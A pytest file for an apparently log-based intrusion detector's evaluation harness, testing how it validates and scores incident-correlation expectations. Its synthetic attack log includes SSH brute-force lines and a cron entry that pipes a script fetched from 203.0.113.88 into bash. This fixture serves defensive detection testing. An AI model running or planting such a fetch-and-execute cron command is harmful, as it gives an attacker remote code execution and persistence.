"""Tests for incident expectations in the evaluation harness (Phase 6).

Covers label validation for ``expect.incidents / incident_rules / incident_stages``,
pass/fail scoring of those expectations, the guarantee that scenarios WITHOUT them
serialize exactly as before, and that the committed benchmark is unchanged for
its original scenarios.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest
import yaml

from sentinelai.core.exceptions import EvaluationError
from sentinelai.evaluation.runner import load_scenarios, run_scenario

ROOT = Path(__file__).resolve().parent.parent / "benchmarks"
SCENARIOS = ROOT / "scenarios"
BASELINE = ROOT / "baseline.json"

LOG_NAME = "auth.log"
IP = "203.0.113.88"
INCIDENT_KEYS = {"incidents", "incident_rules", "incident_stages", "incident_ok"}
CHAIN_RULES = ["R001", "R005", "R012", "R040"]
CHAIN_STAGES = ["Credential Access", "Privilege Escalation", "Persistence"]

CHAIN_LINES = [
    f"2026-01-07T12:00:{n * 4:02d}+00:00 web01 sshd[300{n}]: "
    f"Failed password for root from {IP} port 4200{n} ssh2"
    for n in range(6)
] + [
    f"2026-01-07T12:04:00+00:00 web01 sshd[3007]: Accepted password for root from {IP} "
    "port 42012 ssh2",
    "2026-01-07T12:09:00+00:00 web01 usermod[3101]: add 'root' to group 'sudo'",
    f"2026-01-07T12:14:00+00:00 web01 CRON[3201]: (root) CMD (curl -s http://{IP}/p.sh | bash)",
]
SINGLE_ALERT_LINES = CHAIN_LINES[:6]
BENIGN_LINES = [
    "2026-01-07T12:00:00+00:00 web01 sshd[4001]: "
    "Accepted publickey for alice from 198.51.100.4 port 50000 ssh2"
]


def write_scenario(
    root: Path,
    dirname: str = "sc",
    *,
    lines: list[str] | None = None,
    expect: dict[str, Any] | None = None,
    **overrides: Any,
) -> Path:
    """Create ``root/dirname`` with a log and a labels.yaml (default: R001 attack)."""
    directory = root / dirname
    directory.mkdir(parents=True)
    log_lines = CHAIN_LINES if lines is None else lines
    (directory / LOG_NAME).write_text("\n".join(log_lines) + "\n", encoding="utf-8")
    data: dict[str, Any] = {
        "name": dirname,
        "kind": "attack",
        "description": "incident test scenario",
        "files": [LOG_NAME],
        "expect": {"rules": ["R001"]} if expect is None else expect,
    }
    data.update(overrides)
    data = {k: v for k, v in data.items() if v is not None}
    (directory / "labels.yaml").write_text(yaml.safe_dump(data), encoding="utf-8")
    return directory


def run_one(root: Path, state: Path) -> Any:
    scenario = load_scenarios(root)[0]
    result, _ai = run_scenario(scenario, state)
    return result


class TestIncidentLabelValidation:
    def test_valid_incident_expectations_are_loaded(self, tmp_path: Path) -> None:
        expect = {
            "rules": ["R001"],
            "incidents": 1,
            "incident_rules": ["R005", "R001"],
            "incident_stages": ["Persistence", "Credential Access"],
        }
        write_scenario(tmp_path, expect=expect)

        label = load_scenarios(tmp_path)[0].label

        assert label.expect_incidents == 1
        assert label.expect_incident_rules == ("R005", "R001")  # order preserved, not sorted
        assert label.expect_incident_stages == ("Persistence", "Credential Access")
        assert label.has_incident_expectation is True

    def test_label_without_incident_keys_has_no_expectation(self, tmp_path: Path) -> None:
        write_scenario(tmp_path)

        label = load_scenarios(tmp_path)[0].label

        assert label.expect_incidents is None
        assert label.expect_incident_rules == ()
        assert label.expect_incident_stages == ()
        assert label.has_incident_expectation is False

    @pytest.mark.parametrize("bad", [-1, -100])
    def test_negative_incident_count_is_rejected(self, tmp_path: Path, bad: int) -> None:
        write_scenario(tmp_path, expect={"rules": ["R001"], "incidents": bad})

        with pytest.raises(EvaluationError, match="expect.incidents must be an integer >= 0"):
            load_scenarios(tmp_path)

    @pytest.mark.parametrize("bad", [True, False])
    def test_bool_incident_count_is_rejected(self, tmp_path: Path, bad: bool) -> None:
        write_scenario(tmp_path, expect={"rules": ["R001"], "incidents": bad})

        with pytest.raises(EvaluationError, match="expect.incidents"):
            load_scenarios(tmp_path)

    @pytest.mark.parametrize("bad", ["1", 1.5, [1], {"n": 1}])
    def test_non_integer_incident_count_is_rejected(self, tmp_path: Path, bad: Any) -> None:
        write_scenario(tmp_path, expect={"rules": ["R001"], "incidents": bad})

        with pytest.raises(EvaluationError, match="expect.incidents"):
            load_scenarios(tmp_path)

    def test_unknown_rule_in_incident_rules_is_rejected(self, tmp_path: Path) -> None:
        write_scenario(
            tmp_path, expect={"rules": ["R001"], "incidents": 1, "incident_rules": ["R999"]}
        )

        with pytest.raises(EvaluationError, match="unknown rule 'R999'"):
            load_scenarios(tmp_path)

    def test_ai_rule_id_is_accepted_in_incident_rules(self, tmp_path: Path) -> None:
        write_scenario(
            tmp_path, expect={"rules": ["R001"], "incidents": 1, "incident_rules": ["AI001"]}
        )

        assert load_scenarios(tmp_path)[0].label.expect_incident_rules == ("AI001",)

    def test_non_list_incident_rules_is_rejected(self, tmp_path: Path) -> None:
        write_scenario(
            tmp_path, expect={"rules": ["R001"], "incidents": 1, "incident_rules": "R001"}
        )

        with pytest.raises(EvaluationError, match="incident_rules"):
            load_scenarios(tmp_path)

    def test_non_list_incident_stages_is_rejected(self, tmp_path: Path) -> None:
        write_scenario(
            tmp_path, expect={"rules": ["R001"], "incidents": 1, "incident_stages": "Persistence"}
        )

        with pytest.raises(EvaluationError, match="incident_stages"):
            load_scenarios(tmp_path)

    def test_incident_rules_without_incidents_count_is_rejected(self, tmp_path: Path) -> None:
        write_scenario(tmp_path, expect={"rules": ["R001"], "incident_rules": ["R001"]})

        with pytest.raises(EvaluationError, match="require expect.incidents >= 1"):
            load_scenarios(tmp_path)

    def test_incident_stages_without_incidents_count_is_rejected(self, tmp_path: Path) -> None:
        write_scenario(tmp_path, expect={"rules": ["R001"], "incident_stages": ["Persistence"]})

        with pytest.raises(EvaluationError, match="require expect.incidents >= 1"):
            load_scenarios(tmp_path)

    def test_incident_rules_with_zero_incidents_is_rejected(self, tmp_path: Path) -> None:
        write_scenario(
            tmp_path, expect={"rules": ["R001"], "incidents": 0, "incident_rules": ["R001"]}
        )

        with pytest.raises(EvaluationError, match="require expect.incidents >= 1"):
            load_scenarios(tmp_path)

    def test_benign_scenario_with_zero_incidents_is_valid(self, tmp_path: Path) -> None:
        write_scenario(tmp_path, kind="benign", expect={"incidents": 0}, lines=BENIGN_LINES)

        label = load_scenarios(tmp_path)[0].label

        assert label.kind == "benign"
        assert label.expect_incidents == 0
        assert label.has_incident_expectation is True

    def test_unknown_expect_key_is_still_rejected(self, tmp_path: Path) -> None:
        write_scenario(tmp_path, expect={"rules": ["R001"], "incident_count": 1})

        with pytest.raises(EvaluationError, match="unknown keys in 'expect'"):
            load_scenarios(tmp_path)


class TestIncidentScoring:
    def _chain(self, tmp_path: Path, **expect: Any) -> Any:
        write_scenario(tmp_path / "bench", expect={"rules": CHAIN_RULES, **expect})
        return run_one(tmp_path / "bench", tmp_path / "state")

    def test_matching_incident_expectations_pass(self, tmp_path: Path) -> None:
        result = self._chain(
            tmp_path,
            incidents=1,
            incident_rules=CHAIN_RULES,
            incident_stages=CHAIN_STAGES,
        )

        assert result.passed is True
        assert result.incident_ok is True
        assert result.incidents == 1
        assert result.incident_rules == CHAIN_RULES
        assert result.incident_stages == CHAIN_STAGES
        assert result.has_incident_expectation is True

    def test_count_only_expectation_passes(self, tmp_path: Path) -> None:
        result = self._chain(tmp_path, incidents=1)

        assert result.passed is True
        assert result.incident_rules == CHAIN_RULES  # still reported

    def test_wrong_incident_count_fails_the_scenario(self, tmp_path: Path) -> None:
        result = self._chain(tmp_path, incidents=2)

        assert result.incidents == 1
        assert result.incident_ok is False
        assert result.passed is False
        assert result.missing_rules == []  # detection itself is fine

    def test_zero_expected_but_incident_produced_fails(self, tmp_path: Path) -> None:
        result = self._chain(tmp_path, incidents=0)

        assert result.incidents == 1
        assert result.incident_ok is False
        assert result.passed is False

    def test_wrong_rule_order_fails_the_scenario(self, tmp_path: Path) -> None:
        result = self._chain(
            tmp_path, incidents=1, incident_rules=["R005", "R001", "R012", "R040"]
        )

        assert result.incident_rules == CHAIN_RULES
        assert result.incident_ok is False
        assert result.passed is False

    def test_missing_rule_in_incident_fails_the_scenario(self, tmp_path: Path) -> None:
        result = self._chain(tmp_path, incidents=1, incident_rules=["R001", "R005", "R012"])

        assert result.incident_ok is False
        assert result.passed is False

    def test_wrong_stages_fail_the_scenario(self, tmp_path: Path) -> None:
        result = self._chain(
            tmp_path,
            incidents=1,
            incident_stages=["Persistence", "Privilege Escalation", "Credential Access"],
        )

        assert result.incident_stages == CHAIN_STAGES
        assert result.incident_ok is False
        assert result.passed is False

    def test_partial_stages_fail_the_scenario(self, tmp_path: Path) -> None:
        result = self._chain(tmp_path, incidents=1, incident_stages=CHAIN_STAGES[:2])

        assert result.incident_ok is False

    def test_single_alert_log_produces_no_incident_and_zero_expectation_passes(
        self, tmp_path: Path
    ) -> None:
        write_scenario(
            tmp_path / "bench", lines=SINGLE_ALERT_LINES, expect={"rules": ["R001"], "incidents": 0}
        )

        result = run_one(tmp_path / "bench", tmp_path / "state")

        assert result.passed is True
        assert result.incidents == 0
        assert result.incident_rules == []
        assert result.incident_stages == []

    def test_benign_scenario_with_zero_incidents_passes(self, tmp_path: Path) -> None:
        write_scenario(
            tmp_path / "bench", kind="benign", lines=BENIGN_LINES, expect={"incidents": 0}
        )

        result = run_one(tmp_path / "bench", tmp_path / "state")

        assert result.passed is True
        assert result.incidents == 0
        assert result.to_dict()["incident_ok"] is True

    def test_incident_failure_is_independent_of_rule_detection(self, tmp_path: Path) -> None:
        result = self._chain(tmp_path, incidents=3)

        assert result.missing_rules == []
        assert result.unexpected_rules == []
        assert result.risk_ok is True
        assert result.passed is False

    def test_incident_keys_appear_in_to_dict_when_expectation_is_set(
        self, tmp_path: Path
    ) -> None:
        data = self._chain(tmp_path, incidents=1, incident_rules=CHAIN_RULES).to_dict()

        assert set(data) >= INCIDENT_KEYS
        assert data["incidents"] == 1
        assert data["incident_rules"] == CHAIN_RULES
        assert data["incident_ok"] is True
        json.dumps(data)  # serializable


class TestScenariosWithoutIncidentExpectations:
    def test_to_dict_has_no_incident_keys(self, tmp_path: Path) -> None:
        write_scenario(tmp_path / "bench", expect={"rules": CHAIN_RULES})

        result = run_one(tmp_path / "bench", tmp_path / "state")

        assert result.has_incident_expectation is False
        assert result.incidents is None
        assert INCIDENT_KEYS.isdisjoint(result.to_dict())

    def test_correlation_still_runs_but_does_not_affect_pass_fail(self, tmp_path: Path) -> None:
        write_scenario(tmp_path / "bench", expect={"rules": CHAIN_RULES})

        result = run_one(tmp_path / "bench", tmp_path / "state")

        assert result.passed is True
        assert result.incident_ok is True

    def test_benign_scenario_without_expectation_has_no_incident_keys(
        self, tmp_path: Path
    ) -> None:
        write_scenario(tmp_path / "bench", kind="benign", lines=BENIGN_LINES, expect={})

        result = run_one(tmp_path / "bench", tmp_path / "state")

        assert INCIDENT_KEYS.isdisjoint(result.to_dict())
        assert result.passed is True

    def test_adding_expectation_only_adds_the_incident_keys(self, tmp_path: Path) -> None:
        write_scenario(tmp_path / "plain", expect={"rules": CHAIN_RULES})
        write_scenario(tmp_path / "rich", expect={"rules": CHAIN_RULES, "incidents": 1})
        plain = run_one(tmp_path / "plain", tmp_path / "state_a").to_dict()
        rich = run_one(tmp_path / "rich", tmp_path / "state_b").to_dict()

        assert set(rich) - set(plain) == INCIDENT_KEYS
        for key in set(plain) - {"name"}:
            assert rich[key] == plain[key]


@pytest.fixture(scope="module")
def baseline_scenarios() -> dict[str, dict[str, Any]]:
    data = json.loads(BASELINE.read_text(encoding="utf-8"))
    # The Phase 6 incident scenarios (names start with "incident_") carry incident keys on purpose;
    # this guard is about the 53 scenarios that existed before them.
    return {
        entry["name"]: entry
        for entry in data["scenarios"]
        if not entry["name"].startswith("incident_")
    }


class TestCommittedBenchmarkUnchanged:
    def test_baseline_covers_the_53_original_scenarios(
        self, baseline_scenarios: dict[str, dict[str, Any]]
    ) -> None:
        assert len(baseline_scenarios) == 53

    def test_original_scenarios_serialize_exactly_like_the_baseline(
        self, tmp_path: Path, baseline_scenarios: dict[str, dict[str, Any]]
    ) -> None:
        scenarios = {s.label.name: s for s in load_scenarios(SCENARIOS)}
        missing = sorted(set(baseline_scenarios) - set(scenarios))
        assert missing == [], f"baseline scenarios missing from benchmarks/: {missing}"

        mismatched: list[str] = []
        for name, expected in sorted(baseline_scenarios.items()):
            result, _ai = run_scenario(scenarios[name], tmp_path)
            actual = json.loads(json.dumps(result.to_dict()))
            if actual != expected:
                mismatched.append(name)
            assert INCIDENT_KEYS.isdisjoint(actual), name

        assert mismatched == []

    def test_original_scenarios_have_no_incident_expectations(
        self, baseline_scenarios: dict[str, dict[str, Any]]
    ) -> None:
        for scenario in load_scenarios(SCENARIOS):
            if scenario.label.name in baseline_scenarios:
                assert scenario.label.has_incident_expectation is False, scenario.label.name
